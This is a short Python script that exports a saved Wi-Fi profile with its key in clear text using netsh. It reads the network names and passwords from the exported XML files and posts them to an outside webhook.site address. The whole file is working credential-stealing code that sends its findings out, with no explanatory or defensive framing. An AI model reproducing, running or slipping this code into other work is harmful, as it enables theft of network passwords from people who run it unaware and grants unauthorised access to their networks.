import subprocess, os, sys, requests
import xml.etree.ElementTree as ET

url = "https://webhook.site/fd8e1e93-208e-4dac-9ec3-de5630ee864c"

wifi_files = []
payload = {
    "SSID": [],
    "Password": []
}

command = subprocess.run(["netsh", "wlan", "export", "profile", "ComHem466D6C", "key=clear"], capture_output=True).stdout.decode()

path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)

for file in wifi_files:
    tree = ET.parse(file)
    root = tree.getroot()
    SSID = root[0].text
    password = root[4][0][1][2].text
    payload["SSID"].append(SSID)
    payload["Password"].append(password)

payload_str = " & ".join("%s=%s" % (k, v) for k, v in payload.items())
r = requests.post(url, params="format=json", data=payload_str)
